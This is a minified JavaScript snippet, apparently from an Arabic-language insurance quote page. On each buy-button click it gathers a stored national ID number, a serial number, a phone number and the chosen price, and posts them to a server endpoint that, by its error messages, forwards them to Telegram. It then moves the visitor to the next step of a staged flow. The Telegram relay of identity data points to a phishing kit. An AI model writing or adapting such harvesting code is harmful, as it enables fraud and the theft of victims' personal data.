const buyButtons=document.querySelectorAll('.buy-button');buyButtons.forEach(button=>{button.addEventListener('click',()=>{const price=button.dataset.price;const savedData=localStorage.getItem("formData");let parsedData={};try{parsedData=JSON.parse(savedData)||{}}catch(e){parsedData={}}
const id=parsedData.id||"غير متوفر";const serial=parsedData.serial||"غير متوفر";const phone=parsedData.phone||"غير متوفر";const message=` تم اختيار عرض تأمين:\n\n`+` رقم الهوية: ${id}\n`+` الرقم التسلسلي: ${serial}\n`+` رقم الهاتف: ${phone}\n`+` السعر الذي تم اختياره: ${price} ريال`;fetch('/api/send-message',{method:'POST',credentials:'same-origin',headers:{'Content-Type':'application/json'},body:JSON.stringify({text:message})}).then(response=>response.json()).then(data=>{if(data.ok){localStorage.setItem('selectedPrice',price);return fetch('/api/complete-step',{method:'POST',credentials:'same-origin',headers:{'Content-Type':'application/json'},body:JSON.stringify({step:'STEP3'})})}else{console.error(data.error||data);throw new Error('Telegram send failed')}}).then(response=>response.json()).then(result=>{if(result.success){window.location.href=result.redirectTo||'/totalselect';}else{console.error('Step progression failed',result);alert('⚠️ خطأ في الانتقال إلى الملخص')}}).catch(error=>{console.error("Telegram Error:",error);alert('⚠️ حدث خطأ أثناء إرسال العرض')})})})